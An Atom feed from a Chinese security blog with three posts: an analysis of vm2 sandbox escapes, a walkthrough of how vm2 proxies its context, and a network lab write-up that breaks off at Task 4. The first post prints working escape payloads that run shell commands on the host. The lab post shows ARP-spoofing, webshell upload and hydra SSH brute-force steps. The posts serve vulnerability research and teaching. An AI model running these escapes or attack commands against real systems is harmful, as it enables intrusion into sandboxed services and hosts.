<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://prontosil.com/"/>
  <updated>2020-06-06T07:15:45.923Z</updated>
  <id>http://prontosil.com/</id>
  
  <author>
    <name>prontosil</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vm2沙箱逃逸分析</title>
    <link href="http://prontosil.com/posts/9c09dcd4/"/>
    <id>http://prontosil.com/posts/9c09dcd4/</id>
    <published>2020-06-06T07:10:33.000Z</published>
    <updated>2020-06-06T07:15:45.923Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客 <a href="https://www.anquanke.com/post/id/207291" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207291</a></p><h1 id="vm2沙箱逃逸分析"><a href="#vm2沙箱逃逸分析" class="headerlink" title="vm2沙箱逃逸分析"></a>vm2沙箱逃逸分析</h1><p>前言：vm2中在版本的更迭中，存在多种逃逸方法，可以参考 <a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a> 但是 issue中都没有给出具体的分析，本文通过几个典型的案例来分析这些代码是如何逃逸出vm2的</p><blockquote><p>注：需要使用git进行回退 <code>git reset --hard 7ecabb1</code></p></blockquote><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>代码：</p><pre><code class="js">&quot;use strict&quot;;const {VM} = require(&#39;vm2&#39;);const untrusted = `var process;Object.prototype.has=(t,k)=&gt;{    process = t.constructor(&quot;return process&quot;)();}&quot;&quot; in Buffer.from;process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()`try{    console.log(new VM().run(untrusted));}catch(x){    console.log(x);}</code></pre><p>看这个案例前，首先需要补充一点es6 proxy的知识 <a href="https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy" target="_blank" rel="noopener">https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy</a> (大神可以略过)</p><p>先看一段代码：</p><pre><code class="js">var handler = {    get () {     console.log(&quot;get&quot;);    }  };  var target = {};  var proxy = new Proxy(target, handler);  Object.prototype.has = function(){    console.log(&quot;has&quot;);  }  proxy.a; //触发get  &quot;&quot; in proxy; //触发has，这个has是在原型链上定义的</code></pre><p>在对象 <code>target</code> 上定义了 <code>get</code> 操作，会拦截对象属性的读取，所以当访问 <code>proxy.a</code> 时，会打印出 <code>get</code></p><p>但是当执行 <code>&quot;&quot; in proxy</code> 时，也会被 <code>has</code>方法拦截，此时，我们虽然没有直接在 <code>target</code> 对象上定义 <code>has</code> 拦截操作，即代理的方法是可以被继承的。</p><p>回到vm2逃逸的代码，vm2中实际运行的代码如下：</p><pre><code class="js">&quot;use strict&quot;;var process;Object.prototype.has = function (t, k) {    process = t.constructor(&quot;return process&quot;)();};&quot;&quot; in Buffer.from;process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre><p><code>Buffer.from</code> 是一个代理对象，vm2的作者一开始并没有给vm2内部的Object 加上 has方法，所以我们可以自己给 <code>Object</code> 对象的原型上添加 <code>has</code> 方法，这时候运行</p><pre><code class="js">&quot;&quot; in Buffer.from;</code></pre><p>就会去执行我们定义好的has方法，由于 <code>proxy</code> 的机制，参数 <code>t</code> 是 <code>function Buffer.from</code> ，这个function是在外部的，其上下文是 nodejs 的global下，所以访问其 <code>constructor</code> 属性就获取到了外部的 <code>Function</code>，从而拿到外部的 <code>process</code></p><p><img src="https://note.youdao.com/yws/public/resource/72e442b82aa434d99808201993948f51/xmlnote/AF5429E1F41644A4916E6FDE856EE57D/3843" alt></p><p>而开发者的修复方案：添加上 has 方法</p><p><img src="https://note.youdao.com/yws/public/resource/72e442b82aa434d99808201993948f51/xmlnote/EC60519C477341F8B034EB30CC151E3E/3842" alt></p><p>可以看到，没有修复之前，<code>Buffer.from</code> 是没有拦截 <code>has</code> 操作的</p><p><img src="https://note.youdao.com/yws/public/resource/72e442b82aa434d99808201993948f51/xmlnote/AED66C06D3234A808F8001F31426992C/3839" alt></p><p>而修复之后：</p><p><img src="https://note.youdao.com/yws/public/resource/e690991d6b73968e2f0ac377c69950e1/xmlnote/DA3571E9B7A643C7B60ACA3D40BC5F39/3495" alt></p><p>由于 <code>Buffer.from</code> 中已经存在了 has 方法，所以不会去原型链上查找</p><h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><p>代码如下</p><pre><code class="js">&quot;use strict&quot;;const {VM} = require(&#39;vm2&#39;);const untrusted = `var process;try{    Object.defineProperty(Buffer.from(&quot;&quot;), &quot;&quot;, {get set(){        Object.defineProperty(Object.prototype,&quot;get&quot;,{get(){            throw x=&gt;x.constructor(&quot;return process&quot;)();        }});        return ()=&gt;{};    }});}catch(e){    process = e(()=&gt;{});}process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();`;try{    console.log(new VM().run(untrusted));}catch(x){    console.log(x);}</code></pre><p>同样地，需要补充一点js的知识：</p><p>js的对象中，存在三种不同的属性：数据属性，访问器属性和内部属性。我们只看数据属性和访问器属性</p><p>数据属性和访问器属性都存在 <code>[[Enumerable]]</code> 和 <code>[[Configurable]]</code> 特性</p><p>不同点：以下特性属于数据属性：</p><ul><li><code>[[Value]]</code>：该属性的属性值，默认为<code>undefined</code>。</li><li><code>[[Writable]]</code>：是一个布尔值，表示属性值（<code>value</code>）是否可改变（即是否可写），默认为<code>true</code>。</li></ul><p>以下特性属于访问器属性</p><ul><li><p><code>[[Get]]</code>：是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code></p></li><li><p><code>[[Set]]</code>：是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code></p></li></ul><pre><code class="js">var obj = {    prop: let obj = {    prop:123,    Writable: true}let jbo = {    get prop(){        return &quot;get&quot;;    },    set prop(val){        console.log(&quot;set&quot;+val);            }}console.log(obj.prop); //123console.log(jbo.prop); //get</code></pre><p>我们也可以通过 <code>Object.defineProperty</code> 来设置对象的访问器属性</p><pre><code class="js">let obj = {};Object.defineProperty(obj, &quot;prop&quot;, {    get(){        return &quot;get&quot;;    }})console.log(obj.prop);</code></pre><p>我们还可以这样写</p><pre><code class="js">let obj = {};Object.defineProperty(obj, &quot;prop&quot;, {    get get(){        console.log(&quot;get1&quot;); //get1        return ()=&gt;{return &quot;get2&quot;};    }})console.log(obj.prop); //get2</code></pre><p>在这种情况下，会先执行 <code>get()</code> 函数，打印 <code>get1</code>，返回一个函数，作为 <code>prop</code> 属性的 getter，之后访问 <code>obj.prop</code> 时，就会打印 <code>get2</code></p><pre><code class="js"> get(){        console.log(&quot;get1&quot;);        return ()=&gt;{return &quot;get2&quot;};    }</code></pre><p>同理：</p><pre><code class="js">let obj = {};Object.defineProperty(obj, &quot;prop&quot;, {    get set(){        console.log(&quot;set1&quot;);        return (val)=&gt;{console.log(&quot;set2&quot;)};    }})obj.prop = 1</code></pre><p>此时会先执行一次 <code>set()</code> 函数打印出 <code>set1</code>，同时设置 <code>prop</code> 属性的 setter 为 <code>(val)=&gt;{console.log(&quot;set2&quot;)}</code> 之后执行 <code>obj.prop  = 1</code> 时，就会打印 <code>set2</code>;</p><p>那么回过头来看vm2逃逸的代码</p><pre><code class="js">var process;try {    let a = Buffer.from(&quot;&quot;)    Object.defineProperty(a, &quot;&quot;, {        get set() {            Object.defineProperty(Object.prototype, &quot;get&quot;, {                get: function get() {                    throw function (x) {                        return x.constructor(&quot;return process&quot;)();                    };                }            });            return ()=&gt;{};        }    });} catch (e) {    process = e(() =&gt; {});}</code></pre><p>执行的过程如下：</p><p><img src="https://note.youdao.com/yws/public/resource/72e442b82aa434d99808201993948f51/xmlnote/4AC564AFACE24BFA85B754349BB93ABD/3841" alt></p><p>参考前文 vm2 实现原理分析，此时得到的a是一个代理对象，当我们在a上定义新属性的时候，被代理的 <code>defineProperty</code> 拦截</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/7AEAC46AED884DC8A749A3C45B976962/3579" alt></p><p>检测传入的 <code>descriptor</code> 上是否设置了 get和set，如果是，调用外部的 <code>host.Object.defineProperty</code> 去实现设置对象属性的</p><p>但是在执行 <code>descriptor.get</code> 的时候，由于 <code>nodejs</code>是异步的，此时已经执行了</p><pre><code class="js">Object.defineProperty(Object.prototype, &quot;get&quot;, {                get: function get() {                    throw function (x) {                        return x.constructor(&quot;return process&quot;)();                    };                }            });</code></pre><p>也就是说，<code>descriptor.get</code> 会沿着原型链寻找到 <code>get</code>, 并且抛出异常，<code>throw x=&gt;x.constructor(&quot;return process&quot;)();</code></p><p>这个抛出的异常，最先被vm2内部捕获到，就是图中的e</p><p>vm2 需要将其包装成一个代理对象之后，继续抛出，所以这个异常被我们写的代码捕获到</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/DF02E93DC526423282E4E3BD3DEA83A6/3597" alt></p><p>vm2抛出的异常，被我们的代码捕获到</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/0CC1155B7809495494A7F5B16223FAEE/3606" alt></p><p>然后我们将其作为函数来调用，那就会触发这个函数代理对象的 <code>apply</code> 方法</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/1AD33A599D7D46C8B8171B650E2E4749/3615" alt></p><p>这里的 <code>target</code> 就是 <code>x=&gt;x.constructor(&#39;return process&#39;)()</code></p><p><code>context</code> 是函数的上下文代理，通过 <code>Decontextify.value</code> 之后是 <code>underfined</code></p><p><code>args</code> 是函数的参数代理，其值为 <code>() =&gt; {}</code></p><p>真正的函数调用发生在</p><pre><code class="js">Contextify.value(fnc.apply(context, Decontextify.arguments(args)));</code></pre><p>这里可以做一下拆分</p><pre><code class="js">let func_arg = Decontextify.arguments(args);let fnc_result = fnc.apply(context, func_arg);let res = Contextify.value(fnc_result);</code></pre><p>逻辑上看，先将函数的参数做一次处理，然后通过反射调用函数，再将得到的结果包装成代理</p><p>问题出在对函数的参数处理上，此处的函数参数为 <code>() =&gt; {}</code> ，是一个函数，并不是代理对象</p><p>所以 <code>Decontextify</code> 将其做了一次包装，使之成为一个代理对象</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/AA7A605A05CB41358A079D57E57D46E1/3642" alt></p><p>然而问题在于，这个函数的代理对象中的get方法的实现</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/759EDD8ACB96461EBF915F5D2AAF1BE8/3647" alt></p><p>当访问 <code>constructor</code> 属性的时候，得到的是 <code>host.Function</code></p><p>如图：</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/CC579504B4F1455BBD3512DE6B8B394E/3655" alt></p><p>这就导致逃溢出沙箱了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于安全客 &lt;a href=&quot;https://www.anquanke.com/post/id/207291&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/207291&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="vm2" scheme="http://prontosil.com/tags/vm2/"/>
    
      <category term="沙箱逃逸" scheme="http://prontosil.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>vm2实现原理分析</title>
    <link href="http://prontosil.com/posts/3f069ae5/"/>
    <id>http://prontosil.com/posts/3f069ae5/</id>
    <published>2020-06-06T07:10:06.000Z</published>
    <updated>2020-06-06T07:15:27.779Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客 <a href="https://www.anquanke.com/post/id/207283" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207283</a></p><h1 id="vm2实现原理分析"><a href="#vm2实现原理分析" class="headerlink" title="vm2实现原理分析"></a>vm2实现原理分析</h1><p>前言：vm是nodejs实现的一个沙箱环境，但是官方文档并不推荐使用vm来运行不可信任的代码，vm2则是一个npm包，在vm的基础上，通过es6新增的代理机制，来拦截对外部属性的访问，那么这个沙箱是否安全呢？本文针对vm2的实现原理，从源码的层面进行分析，看vm2究竟做了些什么。</p><h2 id="vm-API"><a href="#vm-API" class="headerlink" title="vm API"></a>vm API</h2><p>vm2是在vm的基础上实现的沙箱，所以内部调用的还是vm的API，在vm中运行一个沙箱环境：</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/CBDFBCEF45354FA5840EA0101A923A5F/3826" alt></p><p>相应的代码：</p><pre><code class="js">const vm = require(&#39;vm&#39;);const context = {  animal: &#39;cat&#39;,  count: 2};const script = new vm.Script(&#39;count += 1; name = &quot;kitty&quot;;&#39;); //编译codevm.createContext(context); // 创建一个上下文隔离对象for (let i = 0; i &lt; 10; ++i) {  script.runInContext(context); // 在指定的下文里执行code并返回其结果}console.log(context);// 打印: { animal: &#39;cat&#39;, count: 12, name: &#39;kitty&#39; }</code></pre><p>将代码编译为 <code>script</code>，然后创建一个上下文 <code>vm.createContext(context)</code> ，最后我们将编译好的脚本放在一个上下文中运行 <code>script.runInContext</code></p><p>当然也可以不用那么麻烦，直接在沙箱中运行一段代码</p><pre><code class="js">const vm = require(&quot;vm&quot;);console.log(vm.runInNewContext(&quot;let a = 2;a&quot;)); //2</code></pre><p>如果不提供上下文变量，那么vm会自己创建一个隔离的上下文context。</p><p>显而易见，vm中最关键的就是 上下文<code>context</code> ，vm能逃逸出来的原理也就是因为 <code>context</code> 并没有拦截针对外部的 <code>constructor</code> 和 <code>__proto__</code>等属性 的访问</p><h2 id="vm2-API"><a href="#vm2-API" class="headerlink" title="vm2 API"></a>vm2 API</h2><p><code>vm2</code>的代码包中主要有四个文件 <code>cli.js</code>,<code>contextify.js</code>,<code>main.js</code> 和 <code>sandbox.js</code></p><ul><li><code>cli.js</code> 实现vm2的命令行调用</li><li><code>contextify.js</code> 封装了三个对象， <code>Contextify</code> 和 <code>Decontextify</code> ，并且针对 global 的Buffer类进行了代理</li><li><code>main.js</code> vm2执行的入口，导出了 <code>NodeVM</code>, <code>VM</code> 这两个沙箱环境，还有一个 <code>VMScript</code> 实际上是封装了 <code>vm.Script</code></li><li><code>sadbox.js</code>针对 <code>global</code> 的一些函数和变量进行了hook，比如 <code>setTimeout</code>，<code>setInterval</code> 等</li></ul><p>vm2相比vm做了很大的改进，其中之一就是利用了es6新增的 proxy 特性，从而拦截对诸如 <code>constructor</code> 和 <code>__proto__</code> 这些属性的访问</p><p>在vm2 中运行一段代码，如下</p><pre><code class="js">const {VM, VMScript} = require(&quot;vm2&quot;);const script = new VMScript(&quot;let a = 2;a&quot;);console.log((new VM()).run(script));</code></pre><p>其中 VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 <code>run</code> 方法即可运行一段脚本。</p><h2 id="vm2运行原理"><a href="#vm2运行原理" class="headerlink" title="vm2运行原理"></a>vm2运行原理</h2><p>vm2在运行代码的时候，会做如下事情，我们将上文的代码拆分开来。</p><pre><code class="js">const {VM, VMScript} = require(&quot;vm2&quot;);const script = new VMScript(&quot;let a = 2;a&quot;);let vm = new VM();console.log(vm.run(script));</code></pre><p>运行的代码和vm2对应的实现：</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/9F56223991D445A195FBF8C29AF9107F/4164" alt></p><p>当我们创建一个VM的对象的时候，vm2内部引入了 <code>contextify.js</code>，并且针对上下文 <code>context</code> 进行了封装，最后调用 <code>script.runInContext(context)</code> ，可以看到，vm2最核心的操作就在于针对<code>context</code>的封装。</p><h2 id="vm2-是如何封装上下文的"><a href="#vm2-是如何封装上下文的" class="headerlink" title="vm2 是如何封装上下文的"></a>vm2 是如何封装上下文的</h2><blockquote><p>注：由于vm2出现过多次逃逸的问题，所以现有的代码进行了大量的修改，为了方便分析vm2的实现原理，需要clone源码并且回退到 7ecabb1   使用 <code>git reset --hard 7ecabb1</code> 即可回退</p></blockquote><p>我们看到，vm2 引入了 <code>contextify.js</code> ，将 <code>vm.createContext</code>创建的上下文作为参数传入。</p><p>其中引入 <code>contextify.js</code> 的代码比较独特，是调用vm的API将 <code>contextify.js</code> 封装为一个匿名函数</p><pre><code class="js">        Reflect.defineProperty(this, &#39;_internal&#39;, {            value: vm.runInContext(`(function(require, host) { ${cf} \n})`, this._context, {                filename: `${__dirname}/contextify.js`,                displayErrors: false            }).call(this._context, require, host)        });</code></pre><p> <code>host</code> 传入需要用的一些对象</p><pre><code class="js">const host={version:parseInt(process.versions.node.split(&#39;.&#39;)[0]),console,String,Number,Buffer,Boolean,Array,Date,Error,RangeError,ReferenceError,SyntaxError,TypeError,RegExp,Function,Object,VMError,Proxy,Reflect,Map,WeakMap,Set,WeakSet,Promise};</code></pre><p>那么vm2中的 <code>contextify.js</code> 究竟做了什么呢？</p><p>最开始定义了一些常量，并且在global和this上添加了相应的属性</p><pre><code class="js">// eslint-disable-next-line no-invalid-this, no-shadowconst global = this;// global is originally prototype of host.Object so it can be used to climb up from the sandbox.Object.setPrototypeOf(global, Object.prototype);Object.defineProperties(global, {    global: {value: global},    GLOBAL: {value: global},    root: {value: global},    isVM: {value: true}});</code></pre><p>由于是在函数体外部写了 return 语句，所以webstrom报错，但是实际上这段代码是会被封装到函数中的</p><pre><code class="js">function(host, require){...}</code></pre><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/5BBF583B48A541E79FF4CBCB5073E7F7/3820" alt></p><p> <code>Contextify</code> 和 <code>Decontextify</code> 都是两个 <code>WeakMap</code></p><pre><code class="js">const Contextified = new host.WeakMap();const Decontextified = new host.WeakMap();</code></pre><p>WeakMap 是 es6 新增的语法，只接受对象作为键名，并且这些对象是不会被计入垃圾回收机制的，这是为了防止内存泄漏。稍后将会看到，这是用来存储已经被代理过的对象的。</p><p>我们看下第512行， <code>Contextify.readonly</code> 做了些什么</p><pre><code class="js">const LocalBuffer = global.Buffer = Contextify.readonly(host.Buffer, {    allocUnsafe: function allocUnsafe(size) {        return this.alloc(size);    },    allocUnsafeSlow: function allocUnsafeSlow(size) {        return this.alloc(size);    }});</code></pre><p>函数调用图如下：</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/4B69009C454F40A9BF61C2362B6E6D0B/3824" alt></p><p>你可能会很好奇，为什么需要调用这么多层方法，最后返回的又是一个什么呢？</p><p>我们先来看最后一个调用的方法 <code>Contextify.object</code>,从这里可以很清楚地看到，最后返回了一个代理对象，并且其中还做了一个 <code>Object.assign</code> 的操作</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/24D187BE6FCD43F2BCC261D9E426AF65/3816" alt></p><p><code>Object.assign</code>  方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p><p>比如</p><pre><code class="js">const target = { a: 1, b: 2 };const source = { b: 4, c: 5 };const returnedTarget = Object.assign(target, source); // Object { a: 1, b: 4, c: 5 }</code></pre><p>也就是说 <code>source</code> 的b 会覆盖掉 target的 <code>b</code> 了</p><p>那么在上图的操作中， <code>deepTraps &gt; traps &gt; {get:..., set: ...}</code> (大于符号代表会覆盖)</p><p>那么我们来看下此时的 <code>deepTraps</code> 是什么</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/95BFDF357FCB42B59A133CE72F1651C6/3810" alt></p><p>你会发现， <code>set, setPrototypeOf ..</code> 这些方法的返回值都是 false，也就是说当你去调用 <code>Buffer.a = 1</code> 的时候(会被代理的set方法拦截)，是无法成功的</p><p>那么此时的 <code>traps</code> 呢</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/A6B5B6FDD1D243AE9777E3C1292E5FEC/3812" alt></p><p>这些方法倒是并不会返回false，但是也会在合并的时候，覆盖掉前一个对象的 <code>get和getPrototypeOf</code> </p><p>那至于之前调用的那么多方法，只是为了区分这个对象是哪种类型的，从而给它加上不同的 <code>deepTraps</code> ，到最后一个 <code>Contextify.object</code> 方法调用的时候，将它们合并。</p><p>最终，我们得到了这样一个 <code>Buffer</code> 代理对象，</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/BC38B1E6509D47C48400AC918C91FC4B/3827" alt></p><p>这个 <code>Buffer</code> 代理拦截了如下操作</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/CD12E56974274E8BAC69D195BC8A71AD/3822" alt></p><p>实际上这个 <code>Buffer</code> 本身还是nodesj提供的，但是vm2加了一层代理，所以在vm2的沙箱中访问它的属性时就会被设定的方法拦截</p><p>除此之外，<code>Contextify.object</code> 内部还使用了 <code>WeakMap</code> 来存储已经代理过的对象和对象的代理。</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/E08A6D58F1BF4EE9A61523A050557749/3819" alt></p><p>所以在vm2的沙箱环境中，如果是内部的对象，由于vm的实现机制保证了内部定义的对象无法逃逸。如果是外部引入的对象，由于vm2提供的代理机制拦截了 <code>constructor</code> 等属性的访问，从而在很大程度上保证了这个沙箱是安全的。</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/24D187BE6FCD43F2BCC261D9E426AF65/3816" alt></p><h2 id="代码举例"><a href="#代码举例" class="headerlink" title="代码举例"></a>代码举例</h2><p>为了更深入的了解vm2，我们来调试一段代码</p><p>测试方法,在 <code>main.js</code> 中编写如下代码：</p><pre><code class="js">const {VM, VMScript} = require(&#39;vm2&#39;);const fs = require(&#39;fs&#39;);const file = `${__dirname}/sandbox.js`;// By providing a file name as second argument you enable breakpointsconst script = new VMScript(fs.readFileSync(file), file);console.log(new VM().run(script));</code></pre><p>然后在 <code>sandbox.js</code> 中编写</p><pre><code class="js">let a = Buffer.from(&quot;&quot;); //访问Buffer的from属性并调用a.i = () =&gt; {}; //给对象添加属性console.log(a.i); //访问对象的属性</code></pre><p>这样可以在 <code>sandbox.js</code> 中下断点，方便调试运行在沙箱中的代码</p><p>前面已经提到 <code>Buffer</code> 是一个代理对象，访问其所有属性都会被拦截</p><p><img src="https://note.youdao.com/yws/public/resource/ff94ea120a86c7c534bd1577a44aa1e5/xmlnote/95D3101B2055465B9F2882688B769C8C/4117" alt></p><p>其调用过程如下</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/DC1C4D60D8634004BEE2FC2B77E51A86/3828" alt></p><p>我们看到，<code>Buffer</code> 代理对象访问其 <code>from</code> 属性，被代理的 <code>get</code> 方法拦截，经过层层的调用，最终返回一个函数代理对象</p><p><img src="https://p2.ssl.qhimg.com/t0112683473174f27fe.png" alt></p><p>之后调用这个函数，就会被 <code>apply</code> 捕获到，拦截的方法如下：</p><pre><code class="js">apply: (target, context, args) =&gt; {    try {        context = Decontextify.value(context);        // Set context of all arguments to host&#39;s context.        return Contextify.value(fnc.apply(context, Decontextify.arguments(args)));    } catch (e) {        throw Contextify.value(e);    }}</code></pre><p>调用过程如下：</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/BB45E0869930438E872EB9191D56EDEA/3823" alt></p><p>按照proxy的规范，target就是未代理之前的函数，context是函数当前运行的上下文，这里是 <code>Buffer</code> 的代理，args是函数的参数，这里是 <code>&quot;&quot;</code></p><p>这里调用了 <code>Decontextify.value</code> ，实际上 <code>Decontextify</code> 的实现和 <code>Contextify</code> 是对称的，只是略微有一点细节上的区别。<code>Decontextify.value</code> 首先会检查 <code>Contextified</code> 中是否有这个对象，如果有直接返回，否则也会针对其进行一层代理</p><p>从这个函数调用过程中我们看到，虽然vm2是针对很多对象都做了代理，但是当实际要发生一次函数调用的时候，必须要将代理的 “外壳” 给剥除掉，并且必须依靠nodejs提供的API来完成，而如果我们能够捕获到这个被剔除代理的对象，那么就能完成vm2的逃逸，这是vm2沙箱逃逸的核心原理</p><p>之后执行</p><pre><code class="js">a.i = () =&gt; {}; </code></pre><p>给a的属性i赋值，被代理的 <code>set</code> 方法拦截</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/C7AA0829B37746739520DF63B4D0B10A/3818" alt></p><p>这个时候的 <code>value</code> 是一个函数， <code>Decontextify.value</code> 针对其进行了封装，返回一个函数的代理，但是这个函数的代理中：</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/1F6B548324964BD0B96709A18BFF5FB1/3814" alt></p><p>我们看到，如果我们访问这个函数代理对象的 <code>constructor</code> 属性，返回的是 <code>host.Function</code> !</p><p>那我们之后将其取出来是不是就能逃出沙箱了呢？</p><p>我们看最后一行代码</p><pre><code class="js">console.log(a.i); //访问对象的属性</code></pre><p>此时a内部的i对象，实际上是一个函数的代理对象，当执行 <code>a.i</code> 时，会被代理对象a的 <code>get</code> 方法拦截</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/8A8B5060F43F4849BAC905AC2D209DD3/3808" alt></p><p>而不幸的是，vm2的作者显然考虑到了这一点，通过 <code>Contextify.value</code> ，取出被代理之前的对象，所以最终我们得到的还是原来的函数。</p><p><img src="https://note.youdao.com/yws/public/resource/a472413b14e9792c772bd62c520c83d7/xmlnote/850D252123D94B089F5C786A3627B8D7/3811" alt></p><p>这样我们就无法获得那个被代理的函数对象了。但是这里终究是有隐患的，如果我们能够获得这个被代理的对象，那么就能借此逃溢出vm2沙箱。至于究竟如何做到，请看下文vm2沙箱逃逸分析</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于安全客 &lt;a href=&quot;https://www.anquanke.com/post/id/207283&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/207283&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="vm2" scheme="http://prontosil.com/tags/vm2/"/>
    
  </entry>
  
  <entry>
    <title>网安实验综合</title>
    <link href="http://prontosil.com/posts/9fa2ed28/"/>
    <id>http://prontosil.com/posts/9fa2ed28/</id>
    <published>2020-05-24T11:26:24.000Z</published>
    <updated>2020-05-24T11:34:32.540Z</updated>
    
    <content type="html"><![CDATA[<p>实验拓扑图</p><p><img src="/posts/9fa2ed28/clipboard.png" alt></p><h2 id="任务1"><a href="#任务1" class="headerlink" title="任务1"></a>任务1</h2><p>192.168.1.3 定时登录 192.168.1.4 的ftp服务，通过分析流量包可以发现</p><p>使用 ettercap 进行网络嗅探</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.4/21//</code></pre><p><img src="/posts/9fa2ed28/clipboard-1590319617635.png" alt></p><p>登录ftp服务即可得到 key.txt 内容</p><p>同时还发现 192.168.1.4 存在WebLogic 反序列化漏洞，工具包位于 /home/Hack 目录下</p><p><img src="/posts/9fa2ed28/clipboard-1590319617624.png" alt></p><p>读到 key1.txt 内容</p><p><img src="/posts/9fa2ed28/clipboard-1590319617828.png" alt></p><h2 id="任务2"><a href="#任务2" class="headerlink" title="任务2"></a>任务2</h2><p>192.168.1.5 运行了 wordpress 站点，访问得到 key2.txt</p><p><img src="/posts/9fa2ed28/clipboard-1590319618084.png" alt></p><p>这居然是wordpress后台的密码。(这里没办法利用wordpress-rce那个脚本)</p><p>登录到wordpress后台需要 getshell</p><p>这里下载一个 wordpress 的主题，我下载了这个 <a href="https://wordpress.org/plugins/simple-shortcode-block/" target="_blank" rel="noopener">https://wordpress.org/plugins/simple-shortcode-block/</a></p><p>然后将其中的index.php 修改为一句话木马，通过后台上传，这个时候即getshell</p><p><img src="/posts/9fa2ed28/clipboard-1590319618735.png" alt></p><p><img src="/posts/9fa2ed28/clipboard-1590319619225.png" alt></p><p>下载 username.txt 即可</p><p><img src="/posts/9fa2ed28/clipboard-1590319618894.png" alt></p><h2 id="任务3"><a href="#任务3" class="headerlink" title="任务3"></a>任务3</h2><p>使用hydra 暴力破解 192.168.1.6 的ssh口令，已经知道了口令形式为 hacker***</p><p>直接写个脚本生成下</p><pre><code class="python">password = &quot;hacker&quot;a = &quot;0123456789&quot;f = open(&quot;pass.txt&quot;, &quot;w&quot;)for i in a:    for j in a:        for k in a:            ppp = password + i + j + k            f.writelines(ppp)            f.writelines(&quot;\n&quot;)f.close()</code></pre><p>爆破出来</p><pre><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh </code></pre><p><img src="/posts/9fa2ed28/clipboard-1590319619093.png" alt></p><p>登录之后发现有两块网卡</p><p><img src="/posts/9fa2ed28/clipboard-1590319619298.png" alt></p><p>nmap扫描一下</p><p><img src="/posts/9fa2ed28/clipboard-1590319619549.png" alt></p><h2 id="任务4"><a href="#任务4" class="headerlink" title="任务4"></a>任务4</h2><p>在 